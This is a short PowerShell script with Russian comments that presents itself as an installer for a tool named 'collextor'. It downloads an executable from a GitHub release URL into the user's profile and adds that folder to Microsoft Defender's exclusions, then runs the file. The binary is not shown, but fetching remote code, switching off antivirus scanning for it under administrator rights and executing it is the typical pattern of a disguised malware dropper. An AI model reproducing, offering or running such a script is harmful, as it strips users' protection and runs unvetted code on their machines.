# Запускать от имени администратора
$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://github.com/TheAmalgamClient/colex/releases/download/v1/collextor_msvc.exe"

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Write-Host "Скачиваю..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $url -OutFile $exe

Write-Host "Добавляю в исключения Defender..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $dir

Write-Host "Запускаю..." -ForegroundColor Green
Start-Process -FilePath $exe -WorkingDirectory $dir
